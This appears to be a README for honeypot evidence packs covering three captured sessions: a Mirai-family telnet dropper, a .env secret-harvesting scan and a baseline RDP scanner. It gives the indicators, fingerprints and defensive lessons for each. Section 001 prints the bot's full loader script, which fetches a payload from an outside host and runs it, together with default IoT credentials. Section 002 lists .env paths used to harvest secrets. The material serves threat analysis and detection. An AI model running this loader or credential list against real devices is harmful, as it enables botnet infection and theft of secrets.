# Evidence packs

Real attacks against a live honeypot sensor. Each pack is a self-contained ZIP —
the packets, the written analysis, machine-readable indicators, and a manifest
that lets you verify the file and reproduce the query.

> ⚠ **These captures contain live hostile traffic.** Open them in an isolated
> environment and do not casually fetch the URLs inside.

---

## The packs

| # | Download | Service | In one line | Size |
|---|---|---|---|---|
| **001** | [`rpot-42_232_28_201-20260719T165926Z-sanitised.zip`](rpot-42_232_28_201-20260719T165926Z-sanitised.zip) | telnet | A Mirai-family bot logs in with a DVR default password and pulls its payload — the full loader script, start to finish, in 8 seconds. → [details](#001--iot-malware-dropper-telnet) | 7.6 KB |
| **002** | [`rpot-80_94_95_211-20260719T170716Z-sanitised.zip`](rpot-80_94_95_211-20260719T170716Z-sanitised.zip) | HTTP | 55 requests hunting for leaked `.env` and config files across every framework layout. No login, no shell — pure enumeration. → [details](#002--env-secret-harvester-http) | 88 KB |
| **003** | [`rpot-66_228_35_180-20260719T170945Z-sanitised.zip`](rpot-66_228_35_180-20260719T170945Z-sanitised.zip) | RDP | An internet-wide scanner knocking on RDP. Included as the *baseline*: what a low-substance session looks like. → [details](#003--rdp-research-scanner-baseline) | 2.6 KB |

Start with **001** if you only look at one — it is the complete story from first
packet to payload.

**New to this?** 001 and 003 are one TCP session each and small enough to read
packet by packet in Wireshark. 002 spans several days and is better approached
through `iocs.json` first.

---

## What is in every pack

| File | Purpose |
|---|---|
| `capture.pcap` | The packets. Wireshark, tshark, Zeek, Suricata — whatever you use. |
| `report.pdf` | The analysis written up: identity, activity, credentials, commands, files, and the exact query used to cut the capture. |
| `iocs.json` / `iocs.yaml` | Indicators, machine-readable. Same content, two formats. |
| `misp-event.json` / `.yaml` | MISP core format. **Event ▸ Import from ▸ MISP JSON**. |
| `SHA256SUMS` | `sha256sum -c SHA256SUMS` — verify nothing changed in transit. |
| `MANIFEST.txt` | Digests, the Arkime expression and window, handling notes. |

Format reference: [`docs/EVIDENCE-BUNDLE.md`](../docs/EVIDENCE-BUNDLE.md).

### Verify any pack

```sh
unzip rpot-<ip>-<utc>-sanitised.zip -d pack && cd pack
sha256sum -c SHA256SUMS
```

`MANIFEST.txt` carries the Arkime expression and UTC window used to cut the
capture, so the result is reproducible against any capture covering that window —
not only mine.

### Sanitisation

All published packs are **sanitised**. The sensor's own addresses are rewritten
to RFC 5737 / RFC 3849 documentation ranges (`192.0.2.x`, `2001:db8::x`) in both
the report and the PCAP; MAC addresses are replaced with locally-administered
values.

**The attacker's data is never altered** — addresses, ports, payloads and timings
are exactly as captured, because anything else would make the packs worthless for
correlation.

One limit worth knowing: packet *payloads* are not rewritten. Service banners,
host keys and certificates inside the traffic are untouched. Sanitisation removes
the obvious identifiers; it is not anonymisation.

### At a glance

| | 001 telnet | 002 HTTP | 003 RDP |
|---|---|---|---|
| Capture size | 7.6 KB | 88 KB | 2.6 KB |
| Duration | 8 s | ~3.5 days | 11 s |
| Credentials | 1 accepted | none | attempt only |
| Commands | 11 | none | none |
| Payload | yes | none | none |
| AbuseIPDB | 0 | 100 | 100 |
| Verdict | **compromise attempt** | **reconnaissance** | **inventory** |

Note the AbuseIPDB row. More on that in [003](#a-note-on-reputation-scores).

---
---

## 001 · IoT malware dropper (telnet)

**[`rpot-42_232_28_201-20260719T165926Z-sanitised.zip`](rpot-42_232_28_201-20260719T165926Z-sanitised.zip)** · 7.6 KB · sanitised

A Mirai-family bot logs in with an embedded-device default password and pulls its
payload. One TCP session, eight seconds, complete from first packet to loader
fetch.

| | |
|---|---|
| Source | `42.232.28.201` — `hn.kd.ny.adsl` |
| Network | AS4837 CHINA UNICOM China169 Backbone, China |
| Service | telnet (23) |
| Scope | one TCP session — `ip.src == 42.232.28.201 && port.src == 37233` |
| Window | 2026-07-19 16:56:59 → 16:57:07 UTC (8 seconds) |
| Capture | 7,594 bytes |
| JA4T | `29040_2-4-8-1-3_1400_5` |
| JA4TS | `65160_2-4-8-1-3_1460_7`, `29040_2-4-8-1-3_1400_5` |
| AbuseIPDB | 0 — see [note](#a-note-on-reputation-scores) |

### What it shows

The credential that worked is `admin` / `cat1029`, accepted on the second
attempt. Across the wider campaign this source tried thousands of credentials
from a DVR, IP-camera and fibre-router list — `root/xc3511` (XiongMai/Dahua),
`root/hi3518` (HiSilicon SoC), `admin/gpon@Vnt00` (GPON ONT), `CUAdmin/CUAdmin`
(China Unicom CPE). It is hunting embedded Linux devices, not servers.

**"Accepted" means the honeypot accepted it.** Cowrie is configured to let a
login through after a few attempts, precisely so the session continues and stage
two becomes observable. No real device was compromised.

Eleven commands follow. First, a probe for a usable shell through eight vendor
idioms:

```
start · enable · config terminal · system · linuxshell · su · shell · sh
```

`enable` and `config terminal` are Cisco-style; `linuxshell` and `system` are DVR
firmware menus. The script does not know what it has landed on, so it tries the
lot.

Then the loader, which is worth reading line by line:

```sh
>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;
>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;
rm -rf i;
wget hxxp://90.224.208.190:36646/i || curl -O hxxp://90.224.208.190:36646/i ||
  /bin/busybox wget hxxp://90.224.208.190:36646/i;
chmod 777 i || (cp /bin/ls ii;cat i>ii &&rm i;cp ii i;rm ii);
./i;
/bin/busybox echo -ne '\x5a\x51\x49\x42\x51\x59'
```

- **Writable-directory hunt.** Create a probe file, `cd` there only if it worked, across seven candidate directories. Embedded devices have read-only filesystems in unpredictable places and the script cannot know which in advance.
- **`rm -rf i`.** Clean up a previous infection — or a competitor's. IoT botnets fight over the same devices.
- **Three download methods.** `wget`, `curl`, then `busybox wget`. You cannot assume which binaries a device has; BusyBox goes last because it is the most limited and the most likely to exist.
- **The `chmod` fallback.** If `chmod` is missing, copy `/bin/ls`, overwrite its *contents* with the payload, and inherit its execute bit. This is why the technique still works on stripped firmware.
- **The marker.** `\x5a\x51\x49\x42\x51\x59` decodes to `ZQIBQY`. The bot prints it and watches for it to come back, confirming a real shell rather than a dead socket **or a honeypot**. Sandbox detection is part of its normal routine — and because the marker is randomised per campaign, it is one of the most durable behavioural fingerprints in the capture.

### Indicators

| Type | Value | Note |
|---|---|---|
| Loader URL | `hxxp://90.224.208.190:36646/i` | The thing worth sharing |
| Payload SHA256 | `f1de86208c3a615b66d166fca4329aac1be7587e9858924b07bf5aa945ac1d05` | Survives everything |
| Credential | `admin` / `cat1029` | Accepted after 2 attempts |
| Marker | `ZQIBQY` | Campaign-unique, behavioural |
| JA4T | `29040_2-4-8-1-3_1400_5` | Survives address rotation |
| Source | `42.232.28.201` | Disposable — an ADSL line that will rotate |

**The loader host moves.** Earlier the same day, this same actor running this same
script used a **different** loader host. Same bot, new infrastructure within
hours — which is exactly why the payload hash and the JA4 fingerprint are worth
more than either IP address.

### Try this

- Follow the TCP stream in Wireshark — the credential and every command are in clear text, and the device's responses to the failed shell probes are as informative as the commands themselves.
- Compare the JA4T here with 003's. Two very different clients, two very different TCP stacks.
- Import `misp-event.json` and see how the credential, URL and hash land as typed attributes.

---

## 002 · `.env` secret harvester (HTTP)

**[`rpot-80_94_95_211-20260719T170716Z-sanitised.zip`](rpot-80_94_95_211-20260719T170716Z-sanitised.zip)** · 88 KB · sanitised

Somebody hunting for leaked credentials in deployment files. 55 unique paths,
every one a variant of `.env` or a config file, walked across every framework
layout they could think of. No login attempt, no shell, no payload — pure
enumeration.

| | |
|---|---|
| Source | `80.94.95.211` |
| Network | AS204428 SS-Net, Romania |
| Service | HTTP (80) |
| Scope | multiple sessions from one source |
| Window | 2026-07-16 01:28 → 2026-07-19 16:39 UTC (spans ~3.5 days) |
| Capture | 90,545 bytes |
| JA4H | `ge11nn06enus_8d3d7241d0f5_000000000000_000000000000` |
| JA4T | `64240_2-4-8-1-3_1460_9` |
| AbuseIPDB | 100 |

### What it shows

A `.env` file is where a Laravel, Symfony or Node application keeps its database
password, its API keys, its SMTP credentials and its cloud tokens. It is supposed
to sit outside the web root. When a deployment gets it wrong, fetching one URL
hands over the lot.

This actor is systematically checking whether you got it wrong:

```
/.env                          /laravel/.env              /.env.production
/.env.php                      /wp-content/.env           /.env.production.local
/.env.local.php                /app_dev.php/_profiler/.env
/config/.env.php               /var/.env.local.php        /.env.backup
/twilio/.env.php               /vendor/.env               /.env.old
/sendgrid/.env.php             /storage/.env              /.env_sample
```

Read the list and you can reconstruct their target model:

- **Framework layouts** — `/laravel/`, `/app_dev.php/_profiler/` (Symfony debug toolbar), `/var/`, `/vendor/`, `/wp-content/`
- **Deployment conventions** — `/prod/`, `/staging/`, `/dev/`, `/old/`, `/new/`, `/backend/`, `/api/`
- **Backup mistakes** — `.env.bak`, `.env-backup`, `.env.old`, `.env_sample`, `.env.example`
- **Named services** — `/twilio/.env.php`, `/sendgrid/.env.php`

Those last two are the tell. Twilio and SendGrid credentials are directly
monetisable: SMS and email sending capacity, resold or used for phishing. This is
not curiosity, it is shopping.

### The interesting indicator is not the path list

Anyone can change a wordlist. What is harder to change is how their HTTP client
constructs a request, and that is what **JA4H** captures — method, version,
header count and ordering, cookie presence, accepted language:

```
ge11nn06enus_8d3d7241d0f5_000000000000_000000000000
```

`ge11` — a GET over HTTP/1.1. `nn` — no cookies, no referer. `06` — six headers.
`enus` — `Accept-Language: en-US`. The hash that follows is the ordered header
set.

That fingerprint identifies the tool, not the deployment. If this actor rotates
through a hosting provider's address range tomorrow — which, at AbuseIPDB 100,
they likely will — the JA4H is what still matches.

### Indicators

| Type | Value | Note |
|---|---|---|
| Source | `80.94.95.211` | AS204428 SS-Net, Romania |
| JA4H | `ge11nn06enus_8d3d7241d0f5_000000000000_000000000000` | The durable one |
| JA4T | `64240_2-4-8-1-3_1460_9` | TCP stack fingerprint |
| Paths | 55 unique `.env` / config variants | Full list in `iocs.json` |

No credentials, no commands, no payload — there is nothing to hash here. That
absence is itself the finding: this actor never tries to gain access, only to
read something that should not be readable.

### Try this

- This pack spans several days and several sessions — start with `iocs.json` rather than the PCAP, then go back to the packets for the requests that interest you.
- `tshark -r capture.pcap -Y http.request -T fields -e http.request.uri` gives you the path list straight out of the capture; compare it with `iocs.json` and you have verified my analysis rather than trusted it.
- Check your own logs for these paths. This wordlist is common, and if you run anything public-facing you have almost certainly been asked for `/.env` this week.

---

## 003 · RDP research scanner (baseline)

**[`rpot-66_228_35_180-20260719T170945Z-sanitised.zip`](rpot-66_228_35_180-20260719T170945Z-sanitised.zip)** · 2.6 KB · sanitised

An internet-wide scanner knocking on RDP. Connect, an authentication attempt,
disconnect — eleven seconds, then gone.

Published as the **baseline**. Knowing what a low-substance session looks like on
the wire is what makes the other two legible.

| | |
|---|---|
| Source | `66.228.35.180` — `prod-beryllium-us-east-59.li.binaryedge.ninja` |
| Network | AS63949 Akamai Connected Cloud, United States (Cedar Knolls) |
| Service | RDP (3389) |
| Scope | one TCP session — `ip.src == 66.228.35.180 && port.src == 38906` |
| Window | 2026-07-19 14:05:16 → 14:05:27 UTC (11 seconds) |
| Capture | 2,657 bytes |
| JA4T | `64240_2-1-1-4-1-3_1460_7` |
| JA4TS | `64240_2-1-1-4-1-3_1460_7` |
| AbuseIPDB | 100 |

### What it shows

The reverse DNS gives it away immediately: **BinaryEdge**, a commercial
internet-scanning service that continuously enumerates reachable hosts and sells
the resulting dataset. Shodan, Censys and several others do the same thing.

The session is what that looks like from the receiving end. The scanner completes
a TCP handshake, starts an RDP connection, and leaves. It is not trying to break
in — it is establishing that something answers on 3389 and recording what it
looks like.

**Why publish something this boring?** Because most of what arrives at any
internet-facing host is exactly this, and being able to recognise it in seconds
is a genuine skill. See the [at a glance](#at-a-glance) table above for the
contrast with the other two.

The honeypot's own session classifier reaches the same conclusion automatically:
001 is `content`, 002 is `payload`, this is a `probe`. That classification is what
makes triaging thousands of sessions a minute's work instead of an afternoon's.

### A note on reputation scores

This address scores **100 on AbuseIPDB** — the maximum — for doing research
scanning from a named, attributable, commercially-operated platform.

The IoT dropper in 001, which logged in with a stolen default password and pulled
malware, scored **0**.

Neither score is wrong exactly; they measure how many people reported an address,
which is not the same as how dangerous it is. Widely-seen scanners collect
reports precisely because everyone sees them. A fresh ADSL line running a botnet
loader has not been reported yet.

If you take one thing from these packs, take that. Reputation feeds are an input,
not a verdict, and the evidence you gather yourself outranks them.

### Indicators

| Type | Value | Note |
|---|---|---|
| Source | `66.228.35.180` | BinaryEdge scanning infrastructure |
| rDNS | `prod-beryllium-us-east-59.li.binaryedge.ninja` | Self-identifying |
| JA4T | `64240_2-1-1-4-1-3_1460_7` | Compare with 001 — a very different TCP stack |

### Try this

- 2.6 KB is small enough to read every packet. Do that once — it is a useful calibration for how little traffic a "probe" actually is.
- Compare the JA4T with 001's (`29040_2-4-8-1-3_1400_5`). Different window sizes, different option ordering: a hosted scanner versus an embedded-device bot.
- Look up how your own perimeter logs treat this address. If it is on a blocklist, ask whether that is because it is dangerous or because it is *frequent*.

---

The full analysis walkthrough that produced these is in
**[fantasticfour.md](../fantasticfour.md)**.

